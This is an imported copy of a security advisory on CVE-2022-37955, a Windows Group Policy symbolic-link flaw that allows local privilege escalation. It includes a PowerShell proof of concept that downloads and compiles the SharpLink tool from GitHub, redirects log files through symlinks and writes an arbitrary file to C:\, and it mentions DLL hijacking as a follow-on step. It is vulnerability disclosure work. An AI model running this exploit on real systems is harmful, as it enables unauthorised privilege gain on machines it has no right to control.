---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-28_privilege-escalation-in-microsoft-windows.md
original_filename: 2023-04-28_privilege-escalation-in-microsoft-windows.md
title: Privilege Escalation in Microsoft Windows
category: documents
detected_topics:
- access-control
- command-injection
- automation-abuse
tags:
- imported
- documents
- access-control
- command-injection
- automation-abuse
language: en
raw_sha256: 12448495015982f53c828ff8db47ee68f9af76ff517ed524a8c7bc50c01741e5
text_sha256: 9fb1b8a2e0888e7c950f9aeb8df31f9af30b521ad74e8f17e9fc77677cfa76cd
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# Privilege Escalation in Microsoft Windows

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-28_privilege-escalation-in-microsoft-windows.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `12448495015982f53c828ff8db47ee68f9af76ff517ed524a8c7bc50c01741e5`
- Text SHA256: `9fb1b8a2e0888e7c950f9aeb8df31f9af30b521ad74e8f17e9fc77677cfa76cd`


## Content

---
title: "Privilege Escalation in Microsoft Windows"
page_title: "Security Advisory usd-2022-0034 | usd HeroLab"
url: "https://herolab.usd.de/security-advisories/usd-2022-0034/"
final_url: "https://herolab.usd.de/security-advisories/usd-2022-0034/"
authors: ["Tobias Neitzel (@qtc_de)"]
programs: ["Microsoft (Windows)"]
bugs: ["Local Privilege Escalation"]
publication_date: "2023-04-28"
added_date: "2023-05-22"
source: "pentester.land/writeups.json"
original_index: 1212
---

# 

# usd-2022-0034 | Privilege Escalation in Microsoft Windows

# 

**Advisory ID** : usd-2022-0034  
**Product** : Microsoft Windows  
**Affected Version** : Windows 10 (19044.1826), Windows Server 2019 (17763.3046), probably others...  
**Vulnerability Type** : Improper Link Resolution Before File Access (CWE-59) - Privilege Escalation  
**Security Risk** : High  
**Vendor URL** : <https://www.microsoft.com>  
**Vendor acknowledged vulnerability** : Yes  
**Vendor Status** : Fixed  
**CVE Number:** CVE-2022-37955  
**CVE Link:** <https://nvd.nist.gov/vuln/detail/CVE-2022-37955>

### Affected Component(s)

The vulnerability affects _Group Policy Updates_ that contain policy settings for the _Internet Explorer_. Not all  
policy settings are affected. One of the affected policy settings is the _Internet Explorer User Accelerators_ setting.

### Description

_Windows Group Policy Updates_ may allow low privileged user accounts to elevate their privileges by abusing symbolic file system links.

_Windows Group Policies_ are used to control and define the working environment of users and computers within _Active Directory_.  
They provide a great amount of control and allow to centrally manage Windows settings that should be unified within an organization.  
_Group Policy Settings_ are usually defined on a domain controller and pulled regularly by domain joined computers. After pulling the  
configured settings, the computer is responsible for parsing and applying the obtained policies. During this processing, it was identified  
that the component responsible for parsing _Internet Explorer_ related policy settings performs a copy operation within a user controlled  
location of the file system. By using symbloc file system links, it is possible to redirect this copy operation and write user controlled  
files to arbitrary locations within the file system. From here, there are many known techniques to achieve a privilege escalation, like  
_DLL_ hijacking or overwriting service executables.

### Proof of Concept

When processing _Internet Explorer_ related _Group Policy Updates_ , the file **C:\\\Users\\\user\\\AppData\\\Local\\\Microsoft\\\Internet Explorer\\\brndlog.txt**  
is used for storing log data. Before overwriting the file, it is copied to **C:\\\Users\\\user\\\AppData\\\Local\\\Microsoft\\\Internet Explorer\\\brndlog.bak**.  
If a corresponding _Group Policy Settings_ (like e.g. _Internet Explorer User Accelerators_) is configured, both files should already be present:
  
  
  C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer>dir
  
  Directory of C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer
  
  28/07/2022  11:39  <DIR>  .
  28/07/2022  11:39  <DIR>  ..
  28/07/2022  11:39  713 brndlog.bak
  28/07/2022  11:39  713 brndlog.txt
  ...

Since the folder **C:\\\Users\\\user\\\AppData\\\Local\\\Microsoft\\\Internet Explorer** is fully user controlled, it is possible to delete all items within it  
(It might be the case that a process holds a lock on the directory **C:\\\Users\\\user\\\AppData\\\Local\\\Microsoft\\\Internet Explorer\\\CacheStorage** , but this  
process is use conrolled and can be stopped). Afterwards, tools like [SharpLink](https://github.com/usdAG/SharpLink) can be used to create symbolic  
links for the files **brndlog.txt** and **brandlog.bak**. The file **brndlog.txt** needs to be linked to the file that should be copied and the file **brndlog.bak**  
should be linked to the target location within the file system.
  
  
  PS C:\\> echo "Hello World :D" > C:\\Users\\user\\hello.txt
  PS C:\\> $c = iwr [https://raw.githubusercontent.com/usdAG/SharpLink/main/SharpLink.cs]() -UseBasicParsing
  PS C:\\> Add-Type $c.Content
  PS C:\\> $lg = New-Object de.usd.SharpLink.LinkGroup
  PS C:\\> $lg.AddSymlink("C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\brndlog.txt", "C:\\Users\\user\\hello.txt")
  PS C:\\> $lg.AddSymlink("C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\brndlog.bak", "C:\\usd.txt")
  PS C:\\> $lg.Open()
  [!] Junction directory C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer isn't empty. Delete files? (y/N) y
  [+] Creating Junction: C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer -> \\RPC CONTROL
  [+] Creating DosDevice: Global\\GLOBALROOT\\RPC CONTROL\\brndlog.txt -> \\??\\C:\\Users\\user\\hello.txt
  [+] Symlink setup successfully.
  [+] Junction C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer -> \\RPC CONTROL does already exist.
  [+] Creating DosDevice: Global\\GLOBALROOT\\RPC CONTROL\\brndlog.bak -> \\??\\C:\\usd.txt
  [+] Symlink setup successfully.

After applying a _Group Policy Update_ , the file **C:\\\usd.txt** should be created with user controlled content:
  
  
  PS C:\\> gpupdate /force
  Updating policy...
  
  Computer Policy update has completed successfully.
  User Policy update has completed successfully.
  
  PS C:\\> dir C:\\usd.txt
  
  Directory: C:\\
  
  Mode  LastWriteTime  Length Name
  ----  -------------  ------ ----
  -a----  7/28/2022  12:29 PM  34 usd.txt
  
  
  PS C:\\> type .\\usd.txt
  Hello World :D

### Fix

Whenever high privileged services operate in user controlled parts of the file system they should verify that  
file operations get not redirected to unintended locations. When operating on file system regions that are controled  
by one particular user, this user should be impersonated during the operation.

### References

  * <https://cwe.mitre.org/data/definitions/59.html>
  * <https://github.com/usdAG/SharpLink>
  * <https://github.com/googleprojectzero/symboliclink-testing-tools>
  * <https://herolab.usd.de/security-advisories/usd-2021-0001/>

### Timeline

  * **2022-07-29:** Vulnerability identified by Tobias Neitzel
  * **2022-08-01:** Advisory submitted via MSRC
  * **2022-08-19:** Vendor reports submitted vulnerability out of scope of the Microsoft Bug Bounty program
  * **2022-10-26:** Vendor reports submitted vulnerability as fixed

### Credits

This security vulnerability was identified by Tobias Neitzel of usd AG.
